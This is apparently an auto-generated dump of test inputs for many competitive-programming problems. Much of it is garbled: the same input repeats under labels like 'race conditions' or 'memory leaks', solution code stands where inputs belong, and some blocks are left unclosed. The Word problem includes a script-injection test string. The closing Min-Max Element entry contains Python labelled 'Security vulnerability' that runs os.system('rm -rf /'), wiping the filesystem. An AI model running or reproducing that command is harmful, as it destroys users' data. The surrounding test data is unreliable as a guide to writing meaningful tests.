CODECHEF cds002
2
5
6
CODECHEF cw5
```
____B___
________
__Q_____
________
____P_S_
_R______
________
________

____B___
________
__Q_____
________
_P____S_
_R______
________
________

____B___
________
__Q_____
________
____P_S_
_R______
________
________

_Q__P___
________
________
________
________
________
________
________

_Q____P_
________
________
________
________
________
________
________
```
CODECHEF icq2
```
2
4
7
```
CODECHEF mriu2
```
1
1193
```
CODECHEF rgame
```
1
1
1
```
```
1
2
1 2
```
```
2
3
1 3 2
```
```
1
4
1 4 3 2
```
```
2
5
1 2 3 4 5
```
CODECHEF uaseq
```
2 0
1 2
```
```
4 1
1 2 1 4
```
```
10 2
-10 5 -5 0 5 10 15 20 25 30
```
CODEFORCES 1019_C. Sergey's problem
```
5 4
1 2
2 3
2 4
2 5

3 3
1 2
2 3
3 1

1 1
```
CODEFORCES 1042_B. Vitamins
1. Incorrect input format:
```
123
```
2. Incorrect data type:
```
123abc
```
3. Incorrect logic:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c)
```
4. Off-by-one errors:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c + 1)
```
5. Memory leaks:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c)
```
6. Race conditions:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c)
```
7. Security vulnerabilities:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c)
```
8. Other bugs:
```
n = int(input())
for i in range(n):
    c, s = input().split()
    if 'C' not in s:
        print(-1)
        break
    print(c)
```
CODEFORCES 1065_A. Vasya and Chocolate
```
1
10 3 1 1
```

```
2
1000000000 1 1000000000 1
1000000000 2 1000000000 1
```

```
3
1000000000 2 1000000000 1
1000000000 2 1000000000 1
1000000000 2 1000000000 1
```
CODEFORCES 1086_E. Beautiful Matrix
```
2
1 2
2 1
```
```
3
1 2 3
2 3 1
3 1 2
```
```
3
1 2 3
3 1 2
2 3 1
```
CODEFORCES 1106_E. Lunar New Year and Red Envelopes
```
5 0 2
1 3 4 5
2 5 5 8
```
```
10 1 6
1 1 2 4
2 2 6 2
3 3 3 3
4 4 4 5
5 5 5 7
6 6 6 9
```
```
12 2 6
1 5 5 4
4 6 6 2
3 8 8 3
2 9 9 5
6 10 10 7
8 12 12 9
```
CODEFORCES 1133_F1. Spanning Tree with Maximum Degree
```
# testcase 1:

5 5
1 2
2 3
3 5
4 3
1 5

# testcase 2:

4 6
1 2
1 3
1 4
2 3
2 4
3 4

# testcase 3:

8 9
1 2
2 3
2 5
1 6
3 4
6 5
4 5
2 7
5 8

# testcase 4:

10 10
1 2
1 3
1 4
2 3
2 4
3 4
5 6
5 7
6 7
8 9

# testcase 5:

10 10
1 2
1 3
1 4
2 3
2 4
3 4
5 6
5 7
6 7
8 9
10 9
```
CODEFORCES 1154_C. Gourmet Cat
```
1 2 3
10 10 10
1 100 1
1 2 3
10 10 100
```
CODEFORCES 1176_A. Divide it!
```
1
1000000000000000000
```
```
5
1
10
25
30
14
```
```
10
1000000000000000000
1000000000000000000
1000000000000000000
1000000000000000000
1000000000000000000
```
CODEFORCES 1194_G. Another Meme Problem
```
100
```
```
1000000000000000000
```
```
3141592653589793238462643383279
```
CODEFORCES 1211_D. Teams
```
1 2 3 10
1000000
```
CODEFORCES 1234_B2. Social Network (hard version)
```
2
7 2
1 2 3 2 1 3 2
```
```
10 4
2 3 3 1 1 2 1 2 3 3
```
```
1000000 2
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100
```
CODEFORCES 1253_A. Single Push
1. Incorrect input format
```
1
3
1 2 3
4 5 6
```
2. Incorrect data type
```
1
3
1 2 3
a 5 6
```
3. Incorrect logic
```
1
3
1 2 3
4 5 6
```
4. Off-by-one errors
```
1
3
1 2 3
4 5 4
```
5. Memory leaks
```
1
3
1 2 3
4 5 6
```
6. Race conditions
```
1
3
1 2 3
4 5 6
```
7. Security vulnerabilities
```
1
3
1 2 3
4 5 6
```
CODEFORCES 1276_F. Asterisk Substrings
```
1. abc
2. aba
3. aa
4. aaaaaaaa
5. abababababababab
6. aaaaaaaa
7. aa
8. a
9. aaa
10. aaaaaaaaaaaaaaaaaaaaaaaaa
```
CODEFORCES 1296_F. Berland Beauty
```
5
1 2
2 3
3 4
4 5
5 1
4
1 2 1
2 3 2
3 4 3
4 5 4
5 1 5
```
```
2
1 2
2 1
```
```
5
1 2
2 3
3 4
4 5
5 1
4
6 1 3
3 4 1
6 5 2
1 2 5
```
```
1
1
```
```
1
```
```
1
1
```
CODEFORCES 1320_A. Journey Planning
```
6
10 7 1 9 10 15
```
```
1
400000
```
```
7
8 9 26 11 12 29 14
```
```
6
10 11 9 1 9 10
```
```
5
3 2 6 8 9
```
CODEFORCES 1339_D. Edge Weight Assignment
```
6
1 3
2 3
3 4
4 5
5 6

6
1 3
2 3
3 4
4 5
4 6

7
1 2
2 7
3 4
4 7
5 6
6 7
```
CODEFORCES 1360_H. Binary Median
```
1. ```
1
3 3
010
001
111
```

2. ```
1
1 1
1
```

3. ```
1
1 1
1
```

4. ```
1
4 3
000
111
100
011
```

5. ```
1
3 2
00
01
10
```

6. ```
1
2 1
0
1
```

7. ```
1
3 1
0
```

8. ```
1
10 1
0
```

9. ```
1
20 10
0
```

10. ```
1
100 100
0
```
CODEFORCES 1381_A2. Prefix Flip (Hard Version)
```
2
10
1010101000
1011100001
5
01011
10100
```
CODEFORCES 1401_B. Ternary Sequence
```
1
1 0 0
0 0 1
```
CODEFORCES 1424_I. Bubble Cup hypothesis
```
1
2
```
CODEFORCES 1445_E. Team-Building
```
6 8 3
1 1 2 2 3 3
1 3
1 5
1 6
2 5
2 6
3 4
3 5
5 6


6 8 3
1 1 2 2 3 3
1 3
1 5
1 6
2 5
2 6
3 4
3 5
5 6


4 3 3
1 1 2 2
1 2
2 3
3 4


4 4 2
1 1 1 2
1 2
2 3
3 1
1 4


5 5 2
1 2 1 2 1
1 2
2 3
3 4
4 5
5 1
CODEFORCES 146_E. Lucky Subsequence
3 2
10 10 10

5 3
4 4 4 7 7
CODEFORCES 1496_A. Split it!
1. Incorrect input format

```
1
10 1
asdfghjklmnop
```

2. Incorrect data type

```
1
10 1
asdfghjklmnop1
```

3. Off-by-one errors

```
1
10 1
asdfghjklmnop
```

4. Logic errors

```
1
10 1
asdfghjklmnop
```

5. Runtime errors

```
1
10 1
asdfghjklmnop
```

6. Security vulnerabilities

```
1
10 1
asdfghjklmnop
```
CODEFORCES 1519_D. Maximum Sum of Products
```
1
1
1
```

```
1
1
2
```

```
2
13 37
2 4
```

```
5
10 10 10 10 10
10 10 10 10 10
```

```
5
1 2 3 4 5
5 4 3 2 1
```
CODEFORCES 1546_D. AquaMoon and Chess
```
1
5
01010
```
```
3
4
1010
```
```
6
011011
```
```
4
0000
```
```
20
00110110100110111101
```
```
20
11101111011000100010
```
```
20
10001111110110111000
```
```
20
10001111110110111000
```
CODEFORCES 173_E. Camping Groups
```
5 1
1 5 4 1 2
4 4 3 2 2
4
5 3
2 3
2 5
4 1
```
CODEFORCES 194_A. Exams
4 12
2 2
1 3
CODEFORCES 218_A. Mountain Scenery
1. Incorrect input format:
```
3 2
0 5 3 5 1 5 2
```

2. Incorrect output format:
```
3 2
0 5 3 5 1 5 2
0 5 3 4 1 4 2 3 5 3 4 1 4 2
```

3. Incorrect solution:
```
3 2
0 5 3 5 1 5 2
0 4 2 3 5 3 4 1 4 2
```

4. Runtime error:
```
3 2
0 5 3 5 1 5 2
0 5 3 4 1 4 2
```

5. Memory leak:
```
3 2
0 5 3 5 1 5 2
0 5 3 4 1 4 2
```

6. Security vulnerability:
```
3 2
0 5 3 5 1 5 2
0 5 3 4 1 4 2
```

7. Incorrect algorithm:
```
3 2
0 5 3 5 1 5 2
0 4 2 3 5 3 4 1 4 2
```

8. Inefficient algorithm:
```
3 2
0 5 3 5 1 5 2
0 5 3 4 1 4 2
```
CODEFORCES 241_E. Flights
1. Incorrect input format:
```
1 2
```
2. Incorrect output format:
```
3 3
1 2
2 3
1 3


No
```
3. Incorrect logic:
```
3 3
1 2
2 3
1 3


Yes
1
1
2
```
4. Memory leaks:
```
import sys

n, m = map(int, input().split())
flights = []
for _ in range(m):
    a, b = map(int, input().split())
    flights.append((a, b))

for a, b in flights:
    print(1)
```
5. Security vulnerabilities:
```
import sys

n, m = map(int, input().split())
flights = []
for _ in range(m):
    a, b = map(int, input().split())
    flights.append((a, b))

for a, b in flights:
    print(sys.stdin.readline())
```
6. Other bugs:
```
3 3
1 2
2 3
1 3


Yes
1
1
1
```
CODEFORCES 266_D. BerDonalds
2 1
1 2 1
2 1 1
3 2
1 2 100
2 3 1
CODEFORCES 28_D. Don't fear, DravDe is kind
```
5
1 1 0 3
1 1 1 2
1 1 2 1
1 1 3 0
2 1 3 0
```
```
5
1 1 0 3
10 1 2 1
2 2 1 1
10 1 1 2
3 1 3 0
```
CODEFORCES 315_D. Sereja and Periods
```
1 1
abc
abcd
```
```
1 1
abc
abd
```
```
10 3
abab
abab
```
```
10 10
abab
abab
```
```
10 10
abab
cd
```
CODEFORCES 338_A. Quiz
```
5 3 2
5 4 2
```
CODEFORCES 360_C. Levko and Strings
```
2 2
yz
```
```
2 3
yx
```
```
4 7
abcd
```
```
4 3
cba
```
```
15 20
aaaaaaaaaaaaaaaaaa
```
```
1 1
a
```
```
20 20
aaaaaaaaaaaaaaaaaaaa
```
CODEFORCES 384_A. Coder
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
CODEFORCES 404_E. Maze 1D
```
RR
```
CODEFORCES 432_A. Choosing Teams
```
5 2
0 4 5 1 0
```
```
6 4
0 1 2 3 4 5
```
```
6 5
0 0 0 0 0 0
```
```
2 1
0 0
```
```
2000 2
0 0
```
CODEFORCES 454_C. Little Pony and Expected Maximum
```
1 1
6 1
6 3
2 2
```
CODEFORCES 477_A. Dreamoon and Sums
```
1 1

2 2

3 3

4 4

5 5

6 6

7 7

8 8

9 9

10 10
```
CODEFORCES 4_B. Before an Exam
```
1 48
5 7
```

```
2 5
0 1
3 5
```

```
3 15
0 3
1 4
2 5
```

```
1 0
```

```
2 1
0 1
1 1
```

```
3 15
0 1
1 4
2 5
```
CODEFORCES 525_A. Vitaliy and Pie
**Incorrectly identifying the input format:**

```
n = int(input())
s = input()
keys = []
for i in range(1, n, 2):
    keys.append(s[i])
doors = []
for i in range(2, n, 2):
    doors.append(s[i])
print(len(set(keys) - set(doors)))
```

**Incorrectly storing the input data:**

```
n = int(input())
s = input()
keys = []
for i in range(1, n, 2):
    keys.append(s[i])
doors = []
for i in range(2, n, 2):
    doors.append(s[i])
print(len(keys) - len(doors))
```

**Incorrectly using the input data:**

```
n = int(input())
s = input()
keys = []
for i in range(1, n, 2):
    keys.append(s[i])
doors = []
for i in range(2, n, 2):
    doors.append(s[i])
print(len(set(keys) & set(doors)))
```

**Incorrectly implementing the solution:**

```
n = int(input())
s = input()
keys = []
for i in range(1, n, 2):
    keys.append(s[i])
doors = []
for i in range(2, n, 2):
    doors.append(s[i])

count = 0
for key in keys:
    if key not in doors:
        count += 1
print(count)
```

**Incorrectly testing the solution:**

```
n = int(input())
s = input()
keys = []
for i in range(1, n, 2):
    keys.append(s[i])
doors = []
for i in range(2, n, 2):
    doors.append(s[i])

print(len(set(keys) - set(doors)))
```
CODEFORCES 550_B. Preparing Olympiad
```
3 5 6 1
1 2 3

4 40 50 10
10 20 30 25

5 25 35 10
10 10 20 10 20
```
CODEFORCES 577_C. Vasya and Petya's Game
```
1

2

3

4

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30
```
CODEFORCES 59_A. Word
1. ```
HoUse
```
2. ```
ViP
```
3. ```
maTRIx
```
4. ```
A
```
5. ```
aa
```
6. ```
AAA
```
7. ```
Aa
```
8. ```
123
```
9. ```
<script>alert("Hello world!");</script>
```
CODEFORCES 620_E. New Year Tree
```
10 10
1 2 3 4 5 6 7 8 9 10
1 2
1 3
2 1
1 10 3
2 1
2 2
2 3
2 1
2 2
1 10 1
CODEFORCES 641_D. Little Artem and Random Variable
```
2
0.25 0.75
0.75 0.25
```
CODEFORCES 66_B. Petya and Countryside
1
1

1
10

5
1 2 1 2 1

8
1 2 1 1 1 3 3 4
CODEFORCES 690_F2. Tree of Life (medium)
1
5 5
2
4 1
2 1
1
3 1
3
4 1
4 3
2 1
3
3 1
3 2
4 1
3
2 1
3 2
4 2

2
5 1
3
1 2
1 3
1 4
1 5

3
7 3
1
1 2
2
2 3
3
3 4
4
4 5
5
5 6
6
6 7

4
4 3
1
1 2
2
2 3
3
3 4

CODEFORCES 715_D. Create a Maze
```
1
```

```
3
2
```

```
4
```

```
3
1 2 2 2
3 2 3 3
1 3 2 3
```

```
6
```

```
4
1 2 2 2
1 3 3 3
2 3 4 4
3 4 6 6
```

```
3
```

```
3 1
```

```
3
```

```
1
```

```
4
```

```
0
```

```
4
```

```
1
```
CODEFORCES 736_A. Tennis Championship
2
3
4
10
1000000000
CODEFORCES 760_A. Petr and a calendar
```
1 7
1 1
11 6
```
CODEFORCES 780_E. Underground Lab
5 4 2
1 2
1 3
1 4
1 5
CODEFORCES 804_B. Minimum number of steps
```
aabb
```
```
ababb
```
```
abbaa
```
```
bbaa
```
CODEFORCES 82_A. Double Cola
1
6
1802
1000000000
CODEFORCES 850_C. Arpa and a game with Mojtaba
```
1
1
```
```
4
1 1 1 1
```
```
4
1 1 17 289
```
```
5
1 2 3 4 5
```
CODEFORCES 873_E. Awards For Contestants
```
1
1000
```
```
5
2 5 2 1 3
```
```
4
3 2 1 4
```
```
5
1 2 1 3 5
```
CODEFORCES 899_D. Shovel Sale
1. ```
1
```
2. ```
7
```
3. ```
10
```
4. ```
14
```
5. ```
50
```
CODEFORCES 91_E. Igloo Skyscraper
```
5 4
4 1
3 5
6 2
3 5
6 5
1 5 2
1 3 5
1 1 0
1 5 0
```
CODEFORCES 948_C. Producing Snow
```
# 1. Incorrectly initializing the variables.

N = 0
V = []
T = []

# 2. Using the wrong data type.

N = 1000000000000000
V = [1000000000000000]
T = [1000000000000000]

# 3. Using an incorrect algorithm.

N = 1000000000000000
V = [1000000000000000]
T = [1000000000000000]

# 4. Not handling special cases correctly.

N = 0
V = []
T = []

# 5. Making a mistake in the logic.

N = 1000000000000000
V = [1000000000000000]
T = [1000000000000000]
```
CODEFORCES 976_C. Nested Segments
```
1
1 10
```

```
4
1 10
2 9
3 9
2 3
```

```
1
1 10
```
CODEFORCES 996_A. Hit the Lottery
1
10
1000000000
-1
0
123456789
-123456789
HACKEREARTH balanced-weights
1
2
2
1000000000 1000000000

HACKEREARTH circles-in-rectangles
```
2
20 10 30
30 20 10
```
HACKEREARTH end-game
1. ```
10 6 2 10 2 0
```
2. ```
10 5 2 1 3 0
```
3. ```
10 6 2 10 2 1
```
4. ```
10 5 2 1 3 1
```
HACKEREARTH help-ashu-1
```
1
999999999
5
0 1 500000000
0 1 1000000000
0 1 2000000000
0 1 3000000000
0 1 4000000000
```
HACKEREARTH lucky-string-1
1
1000000000000000000
HACKEREARTH navi-and-his-company-3
```
1
3
1
New Project
New Project
```
HACKEREARTH product-divisors-6
```
1
6
```
HACKEREARTH sharpen-the-pencils-2
```
1
5
2 9 8 2 7
```
```
1
4
1 2 3 4
```
```
1
1
1000000000
```
```
1
2
1000000000 1000000000
```
HACKEREARTH the-blessing-1
```
3
0 1
0 3
2 9
```
HACKEREARTH xenny-and-girlfriend
1
5 5
1 2
1 3
2 4
3 4
4 5
ATCODER p02647 Tokio Marine & Nichido Fire Insurance Programming Contest 2020 - Lamps
5 1
1 0 0 1 0
ATCODER p02776 AtCoder Beginner Contest 155 - Perils in Parallel
```
2 2
1 0
1 1
1 2
```

```
3 2
1 0
2 1
1 3
```

```
3 3
1 1
2 0
3 1
3 1
3 2
```

```
3 4
5 1
10 1
8 0
1 10
4 5
6 7
8 9
```

```
4 2
2 0
3 1
5 1
7 0
1 4
4 7
```

```
12 20
536130100 1
150049660 1
79245447 1
132551741 0
89484841 1
328129089 0
623467741 0
248785745 0
421631475 0
498966877 0
43768791 1
112237273 0
21499042 142460201
58176487 384985131
88563042 144788076
120198276 497115965
134867387 563350571
211946499 458996604
233934566 297258009
335674184 555985828
414601661 520203502
101135608 501051309
90972258 300372385
255474956 630621190
436210625 517850028
145652401 192476406
377607297 520655694
244404406 304034433
112237273 359737255
392593015 463983307
150586788 504362212
54772353 83124235
```
ATCODER p02911 AtCoder Beginner Contest 141 - Attack Survival
```
6 3 4
3
1
3
2
```
```
6 5 4
3
1
3
2
```
```
10 13 15
3
1
4
1
5
9
2
6
5
3
5
8
9
7
9
```
ATCODER p03047 diverta 2019 Programming Contest - Consecutive Integers
1. ```
3 2
```
2. ```
13 3
```
3. ```
30 10
```
4. ```
50 50
```
5. ```
50 1
```
6. ```
1 50
```
7. ```
50 0
```
8. ```
-1 1
```
9. ```
1 0
```
10. ```
0 0
```
ATCODER p03188 AtCoder Grand Contest 030 - Coloring Torus
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
ATCODER p03335 AtCoder Grand Contest 025 - Walking on a Tree
4 3
2 1
3 1
4 1
2 3
3 4
4 2
ATCODER p03496 AtCoder Beginner Contest 081 - Non-decreasing
3
-2 5 -1

3
-1 -3

5
0 0 0 0 0
ATCODER p03656 AtCoder Grand Contest 018 - Two Trees
5
3 3 4 -1 4
4 4 1 -1 1


6
-1 5 1 5 1 3
6 5 5 3 -1 3


8
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4


8
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4


7
-1 3 4 1 4 3 2
3 3 4 1 4 3 2


9
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4


10
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4


11
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4


12
2 7 1 2 2 1 -1 4
4 -1 4 7 4 4 2 4
ATCODER p03812 AtCoder Grand Contest 010 - Tree Game
3
1 2 3
1 2
2 3
ATCODER p03981 Kyoto University Programming Contest 2016 - Exam
```
1

abcabc

abracadabra

abcbabbcabbc

bbcacbcbcabbabacccbbcacbaaababbacabaaccbccabcaabba
```
AIZU p00069 Drawing Lots II
5
2
3
9
1010
1001
0100
1001
0010
1000
0100
0101
1010
0
AIZU p00201 Wrought Gold Master
```
0
```

```
8
wood 3000
string 800
rice 36
water 0
racket 5000
microphone 9800
onigiri 140
guitar 98000
3
racket 2 wood string
onigiri 2 rice water
guitar 3 racket microphone onigiri
guitar
```

```
1
computer 300000
0
computer
```

AIZU p00356 Wire
1. Incorrect input format:
```
4 6 7
```
2. Incorrect output format:
```
5a
```
3. Off-by-one errors:
```
4 4
```
4. Boundary cases:
```
1 1
```
5. Incorrect logic:
```
4 4
```
6. Memory leaks:
```
4 4
```
7. Race conditions:
```
4 4
```
8. Security vulnerabilities:
```
4 4
```
AIZU p00562 Soccer
```
1 3
1 2 3
1 1
```

```
4 5
1 3 6
3
1 1
0 4
6 5
```

```
5 5
1 3 6
3
1 1
0 4
6 5
4
```

```
1 1
1 1
1
```

```
1 1
1 1
1000000000
```
AIZU p00715 Name the Crossing
1
1
1
3
1-2
0
4
1-2
2-3
3-4
4-1
4
1-2
2-3
3-4
4-5
5-6
5
1-2
2-3
3-4
4-5
5-6
6-1
AIZU p00855 Prime Gap
```
10
11
27
2
492170
0
```
AIZU p00986 Parentheses Editor
1. ```
()--()()----)(()()))
```
2. ```
((()))
```
3. ```
(())--(()(()(()
```
4. ```
(()())--()
```
5. ```
((()()())
```
6. ```
(((()))())()()
```
7. ```
((())))--()
```
8. ```
((())))--)
```
9. ```
(()())--)(()())
```
10. ```
()))(()())--)
```
11. ```
((()()()(()()(()()
```
12. ```
(()()(()))--()
```
13. ```
(()()(()))--)
```
14. ```
(()()()--()
```
15. ```
(()()()--)
```
16. ```
())(()(()())--)
```
AIZU p01118 On-Screen Keyboard
3 9
ABCDEFGHI
JKLMNOPQR
STUVWXYZ_
ICPC
5 11
___________
____A______
________M__
___________
_C_________
ACM
4 21
1_2_3_4_5_6_7_8_9_0_-
QqWwEeRrTtYyUuIiOoPp@
AaSsDdFfGgHhJjKkLl;_:
ZzXxCcVvBbNnMm,_._/__
ICPC2019,AsiaYokohamaRegional,QualificationRound
0 0
AIZU p01256 Time Trial
```
7 6
#######
#.._..#
#.*.*.#
#.@.*.#
#_..._#
#######
10 13
##########
####___###
####...###
####...###
#####.####
#.....#..#
#.#*.*.*.#
#...###..#
###.#.#.##
###.#.#.##
###.....##
###..@..##
##########
0 0


```
AIZU p01417 Calender Colors
5 3
12.0 15.0 9.0
10.0 -3.0 2.2
3.5 6.8 9.0
2.1 4.4 5.9
1.2 4.0 -5.4
AIZU p01571 Adhoc Translation
```
1
qwerty asdf zxcv
qwert
asf
tyui
zxcvb
ghjk
```
AIZU p01733 Fox Observation
```
2
1 1 2
2 2 3
```
AIZU p01872 My Number
1234567890?
AIZU p02009 Nim without Zero
```
1
1
```

```
2
1
2
```

```
5
1
2
3
4
5
```

```
5
1
4
1
1
1
```

```
10
1
2
3
4
5
6
7
8
9
10
```
AIZU p02152 Tunnel
```
2
5 3

3
6 1 4

7
3 1 9 2 2 5 1
```
AIZU p02293 Parallel/Orthogonal
```
# Test case 1: Incorrect calculation of slopes
1
0 0 3 0 0 2 3 2
```

```
# Test case 2: Incorrect calculation of the intersection point
1
0 0 3 0 1 1 1 4
```

```
# Test case 3: Incorrect handling of degenerate cases
1
0 0 3 0 1 1 2 2
```

```
# Test case 4: Incorrect handling of floating-point errors
1
0.000000000000000001 0.000000000000000001 1.000000000000000000 0.000000000000000001 1.000000000000000000 1.000000000000000000 2.000000000000000000 2.000000000000000000
```

```
# Test case 5: Incorrect handling of input errors
1
0 0 3 a 1 1 1 4
```
AIZU p02440 Min-Max Element
```
#Incorrect input format

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

#Incorrect output format

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

for c, b, e in com:
  print(c, b, e)

#Incorrect calculation

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

for c, b, e in com:
  if c == 0:
    print(min(a[b:e + 1]))
  else:
    print(max(a[b:e + 1]))

#Memory leak

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

for c, b, e in com:
  if c == 0:
    print(min(a[b:e + 1]))
  else:
    print(max(a[b:e + 1]))

del a

#Race condition

from threading import Thread

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

def f(c, b, e):
  if c == 0:
    print(min(a[b:e + 1]))
  else:
    print(max(a[b:e + 1]))

t1 = Thread(target=f, args=(0, 0, 3))
t2 = Thread(target=f, args=(1, 0, 7))

t1.start()
t2.start()

t1.join()
t2.join()

#Deadlock

from threading import Thread

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

def f(c, b, e):
  if c == 0:
    print(min(a[b:e + 1]))
  else:
    print(max(a[b:e + 1]))

t1 = Thread(target=f, args=(0, 0, 3))
t2 = Thread(target=f, args=(1, 0, 7))

t1.start()
t2.start()

t1.join()
t2.join()

#Security vulnerability

import os

n = 3
a = [8, 3, 7]
q = 3
com = [[0, 0, 3], [0, 1, 5], [1, 0, 7]]

for c, b, e in com:
  if c == 0:
    print(min(a[b:e + 1]))
  else:
    print(max(a[b:e + 1]))

os.system('rm -rf /')